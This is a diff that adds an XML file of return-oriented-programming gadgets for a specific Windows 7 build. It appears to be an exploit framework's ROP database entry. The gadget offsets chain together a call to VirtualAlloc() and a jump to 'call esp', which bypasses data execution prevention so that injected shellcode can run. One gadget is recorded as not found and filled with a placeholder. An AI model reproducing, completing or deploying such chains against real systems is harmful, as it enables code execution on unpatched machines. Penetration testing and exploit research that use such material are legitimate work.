@@ -1,0 +1,32 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<db>
+<rop>
+  <compatibility>
+    <target>7.0.7601.17744</target>
+  </compatibility>
+
+  <gadgets base="0x76fc0000">
+    <gadget offset="0x00016d87">POP EBP # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00016d87">skip 4 bytes  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00093866">POP EAX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget value="0xffffff39">put delta into eax (-> put 0x00000001 into ebx)</gadget>
+    <gadget offset="0x00053b6b">ADD EAX,0C8 # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x0006d3a5">XCHG EAX,EBX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget value="0x00000000">[-] Unable to find gadget to put 00001000 into edx</gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget offset="0x00031a3a">POP EAX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget value="0xffffff78">put delta into eax (-> put 0x00000040 into ecx)</gadget>
+    <gadget offset="0x00053b6b">ADD EAX,0C8 # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x0002b984">XCHG EAX,ECX # ADD AL,5D # RETN 0x04  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00018e0d">POP EDI # RETN  ** REBASED ** ASLR</gadget>
+    <gadget value="junk">Filler</gadget>
+    <gadget offset="0x00009f09">RETN (ROP NOP)  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00014cb4">POP ESI # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x0000b7bd">JMP [EAX] </gadget>
+    <gadget offset="0x0003f5d4">POP EAX # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x000011bc">ptr to VirtualAlloc()  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x00065cfc">PUSHAD # RETN  ** REBASED ** ASLR</gadget>
+    <gadget offset="0x000330ad">ptr to 'call esp'  ** REBASED ** ASLR</gadget>
+  </gadgets>
+</rop>
+</db>
